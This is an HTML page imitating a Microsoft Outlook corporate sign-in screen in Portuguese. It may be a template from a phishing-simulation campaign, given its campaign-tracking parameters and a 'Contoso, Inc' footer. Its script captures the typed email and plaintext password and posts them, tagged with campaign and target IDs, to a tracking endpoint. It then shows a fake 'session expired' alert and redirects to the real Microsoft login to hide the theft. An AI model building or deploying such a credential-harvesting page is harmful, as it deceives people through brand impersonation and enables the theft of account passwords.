<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar no Outlook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; }
        .container { max-width: 440px; margin: 0 auto; padding: 40px 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 108px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
        .subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 12px; color: #666; margin-bottom: 4px; }
        input { width: 100%; padding: 6px 10px; font-size: 14px; border: 1px solid #8c8c8c; border-radius: 4px; }
        input:focus { border-color: #0078d4; outline: none; }
        .btn { width: 100%; padding: 8px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; }
        .btn:hover { background: #106ebe; }
        .links { margin-top: 16px; font-size: 12px; }
        .links a { color: #0078d4; text-decoration: none; }
        .footer { margin-top: 40px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
                <path d="M0 12.3c0 .6.5 1.1 1.1 1.1h4.7v6.5c0 .6.5 1.1 1.1 1.1.6 0 1.1-.5 1.1-1.1v-6.5h4.7c.6 0 1.1-.5 1.1-1.1s-.5-1.2-1.1-1.2h-6.9V3.6c0-.6-.5-1.1-1.1-1.1-.6 0-1.1.5-1.1 1.1v7.7H1.1c-.6 0-1.1.5-1.1 1.1z" fill="#f25022"/>
                <path d="M15 20.9c0-.6.5-1.1 1.1-1.1h6.9c.6 0 1.1.5 1.1 1.1s-.5 1.1-1.1 1.1h-6.9c-.6 0-1.1-.5-1.1-1.1z" fill="#7fba00"/>
                <path d="M0 3.6c0-.6.5-1.1 1.1-1.1h6.9c.6 0 1.1.5 1.1 1.1S8.6 4.7 8 4.7H1.1c-.6 0-1.1-.5-1.1-1.1z" fill="#7fba00"/>
                <path d="M15 3.6c0-.6.5-1.1 1.1-1.1h6.9c.6 0 1.1.5 1.1 1.1s-.5 1.1-1.1 1.1h-6.9c-.6 0-1.1-.5-1.1-1.1z" fill="#00a4ef"/>
                <path d="M15 12.3c0-.6.5-1.1 1.1-1.1h6.9c.6 0 1.1.5 1.1 1.1s-.5 1.1-1.1 1.1h-6.9c-.6 0-1.1-.5-1.1-1.1z" fill="#ffb900"/>
            </svg>
        </div>
        <h1>Entrar</h1>
        <p class="subtitle">Conta corporativa</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email, telefone ou Skype</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Entrar</button>
        </form>
        
        <div class="links">
            <a href="#" onclick="alert('Para problemas de conta, contacte seu administrador de TI.'); return false;">Não consegue acessar sua conta?</a>
        </div>
    </div>
    
    <div class="footer">
        Uma solicitação deContoso, Inc
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const campaignId = urlParams.get('c');
        const targetEmail = urlParams.get('e');
        const hash = urlParams.get('h');
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send credentials to server
            await fetch('/api/v1/track/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    campaign_id: campaignId,
                    target_email: targetEmail,
                    hash: hash,
                    email: email,
                    password: password
                })
            });
            
            // Show error and redirect to real Microsoft
            alert('Sua sessão expirou. Por favor, entre novamente.');
            window.location.href = 'https://login.microsoftonline.com/';
        });
    </script>
</body>
</html>
